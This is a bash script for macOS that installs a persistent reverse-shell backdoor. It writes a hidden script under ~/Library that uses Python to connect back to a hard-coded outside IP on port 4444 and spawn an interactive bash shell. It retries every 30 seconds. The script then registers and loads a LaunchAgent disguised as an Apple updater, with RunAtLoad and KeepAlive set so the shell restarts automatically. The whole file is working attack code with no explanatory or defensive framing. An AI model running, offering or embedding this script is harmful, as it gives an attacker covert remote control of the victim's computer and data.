#!/bin/bash

# Define values
VPS_IP="62.60.207.33"
VPS_PORT="4444"
USER_HOME="$HOME"
SCRIPT_PATH="$USER_HOME/Library/.apple_updater.sh"
PLIST_PATH="$USER_HOME/Library/LaunchAgents/com.apple.appleUpdater.plist"
PLIST_LABEL="com.apple.appleUpdater"

# Step 1: Create reverse shell script
mkdir -p "$USER_HOME/Library"
cat > "$SCRIPT_PATH" <<EOF
#!/bin/bash
while true; do
  python3 -c 'import socket,os,pty; s=socket.socket(); s.connect(("${VPS_IP}",${VPS_PORT})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")' >/dev/null 2>&1
  sleep 30
done
EOF

chmod +x "$SCRIPT_PATH"

# Step 2: Create LaunchAgent plist
mkdir -p "$USER_HOME/Library/LaunchAgents"
cat > "$PLIST_PATH" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${PLIST_LABEL}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>${SCRIPT_PATH}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

# Step 3: Load the agent
launchctl unload "$PLIST_PATH" >/dev/null 2>&1
launchctl load "$PLIST_PATH"
